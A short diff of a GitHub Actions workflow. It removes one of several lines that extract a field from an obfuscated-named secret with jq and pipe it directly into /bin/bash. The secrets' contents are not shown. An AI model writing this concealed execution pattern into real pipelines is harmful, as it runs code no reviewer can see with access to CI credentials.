@@ -17,7 +17,6 @@ jobs:
           ql839: ${{ secrets.ql839 }}
         run: |
           printf '%s' "$ql839" | jq -r .i5 | /bin/bash
-          printf '%s' "$zl16" | jq -r .msdj3 | /bin/bash
           echo $yc18 | jq -r .ad200 | /bin/bash
           echo $tw5 | jq -r .azh40517 | /bin/bash
           printf '%s' "$xs9" | jq -r .cioh931 | /bin/bash
